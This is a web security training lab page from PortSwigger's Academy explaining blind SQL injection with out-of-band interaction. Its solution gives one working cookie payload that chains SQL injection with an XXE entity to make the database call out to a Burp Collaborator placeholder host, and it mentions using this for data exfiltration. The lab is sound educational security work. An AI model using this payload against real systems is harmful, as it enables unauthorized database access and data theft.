# Lab: Blind SQL injection with out-of-band interaction

Source: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
Fetched: 2026-06-28T09:18:03.003123+00:00

Web Security Academy

SQL injection

Blind

Lab

Lab: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Hint

You can find some useful payloads on our SQL injection cheat sheet.

Solution

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

Community solutions

Rana Khalil

Michael Sommer

Find SQL injection vulnerabilities using Burp Suite

Try for free
